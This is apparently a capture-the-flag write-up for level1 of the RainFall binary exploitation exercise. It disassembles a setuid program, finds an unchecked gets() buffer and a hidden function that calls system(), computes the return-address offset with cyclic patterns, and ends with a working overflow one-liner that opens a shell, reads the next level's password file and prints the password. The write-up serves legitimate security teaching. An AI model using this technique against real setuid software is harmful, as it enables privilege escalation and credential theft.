# Rainfall

## Level1

```sh
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

```sh
level1@RainFall:~$ ./level1 
   
level1@RainFall:~$ 
```
The program is waiting indefinitely and waiting for user input

```sh
level1@RainFall:~$ ./level1 
hello
level1@RainFall:~$ 
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   # Setting up and align stack

   0x08048486 <+6>:     sub    $0x50,%esp
   # Reserve 0x50 bytes (80 in decimal) on the stack
   
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   # Compute the address of a local buffer at esp + 0x10 (16 in decimal)
   # Since 0x50 bytes (80) are allocated for local variables on the stack
   # 0x50 - 0x10 = 0x40, the buffer likely takes up the remaining space
   # So the buffer size is 64 bytes (0x40)

   0x0804848d <+13>:    mov    %eax,(%esp)
   # Move the buffer to the top of the stack to prepare it as an argument for the upcoming function call
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   # gets(buffer)

   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret    
End of assembler dump.
```

Let's see if there is something more in this program

```sh
level1@RainFall:~$ objdump -S level1

level1:     file format elf32-i386
   ...

Disassembly of section .text:
   ...

08048444 <run>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       a1 c0 97 04 08          mov    0x80497c0,%eax
 804844f:       89 c2                   mov    %eax,%edx
 8048451:       b8 70 85 04 08          mov    $0x8048570,%eax
 8048456:       89 54 24 0c             mov    %edx,0xc(%esp)
 804845a:       c7 44 24 08 13 00 00    movl   $0x13,0x8(%esp)
 8048461:       00
 8048462:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
 8048469:       00
 804846a:       89 04 24                mov    %eax,(%esp)
 804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
 804847e:       c9                      leave
 804847f:       c3                      ret

08048480 <main>:
 8048480:       55                      push   %ebp
 8048481:       89 e5                   mov    %esp,%ebp
 8048483:       83 e4 f0                and    $0xfffffff0,%esp
 8048486:       83 ec 50                sub    $0x50,%esp
 8048489:       8d 44 24 10             lea    0x10(%esp),%eax
 804848d:       89 04 24                mov    %eax,(%esp)
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
 8048495:       c9                      leave
 8048496:       c3                      ret
   ...
level1@RainFall:~$
```

> :memo: **Note:** .Text is where user defined functions are located [https://github.com/compilepeace/BINARY_DISSECTION_COURSE/blob/master/ELF/SECTION_HEADER_TABLE/SECTIONS_DESCRIPTION/SECTIONS_DESCRIPTION.md]

We can see that there is another user defined function called run,
run() is located at 0x08048444 and is calling both fwrite and system

<a name="eip-register-anchor">
Let's try to overflow the buffer used by gets in the main function to access the run function
To do it we need to override the content of the EIP register with the address of run(), EIP register hold the address of the next intruction to be executed by the program

We need to find the exact offset of the EIP register
This can be done using cyclic patterns

Exemple:
```
Imagine we have the same situation with a buffer, a call to gets and the eip register that we need to override

Launch the program with gdb and enter your input string
We entered: "abcdefghijklmnopqrstuvwxyz" and a segfault happened

(gdb) run
Starting program: /home/user/mybinary
abcdefghijklmnopqrstuvwxyz

Program received signal SIGSEGV, Segmentation fault.

We can check the register eip by using this command

(gdb) info registers eip
eip            0x75747372       0x75747372
(gdb)

In the gdb output eip value is shown as a 4-byte unsigned integer, it's little endian memory representation is:
0x72 0x73 0x74 0x75

These values correspond to 'r' 's' 't' 'u'

In the string "abcdefghijklmnopqrstuvwxyz", the substring "rstu" starts at index 17

So in order to exploit mybinary we would need to enter 17 characters in order to reach the EIP register
and then 4 character to represent the targeted address

But the alphabet string won't work in our case because the input buffer is larger than 26
so we need to find a cyclic pattern that can go further than that
```

The script to do this is located at : [cyclic.py](https://github.com/Junya42/RainFall/blob/main/level01/Ressources/cyclic.py)

```sh
junya in ~/projects/42/cybersec/RainFall/level1/Ressources λ python3 cyclic.py 100 
1abc1def1ghi1jkl1mno1pqr1stu1vwx1yza2bcd2efg2hij2klm2nop2qrs2tuv2wxy2zab3cde3fgh3ijk3lmn3opq3rst3uvw
```

```sh
(gdb) run
Starting program: /home/user/level1/level1 
1abc1def1ghi1jkl1mno1pqr1stu1vwx1yza2bcd2efg2hij2klm2nop2qrs2tuv2wxy2zab3cde3fgh3ijk3lmn3opq3rst3uvw

Program received signal SIGSEGV, Segmentation fault.
0x68676633 in ?? ()
(gdb) info registers eip
eip            0x68676633       0x68676633
```

```sh
junya in ~/projects/42/cybersec/RainFall/level1/Ressources λ python3 cyclic.py 100 0x68676633
Needle '3fgh' found at offset: 76
```

Now we need to create the perfect input string in order to exploit the program
Remember we need to target the run() address which is: 0x08048444

```sh
level1@RainFall:~$ (python -c "print 76 * 'a' + '\x08\x04\x84\x44'[::-1]" ; cat) | ./level1 
# We first print 76 random characters to reach the EIP offset
# Then we enter the address of our target in little endian format
# We then call cat to retrieve our input string and pipe it to the program

Good... Wait what?
pwd
/home/user/level1
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```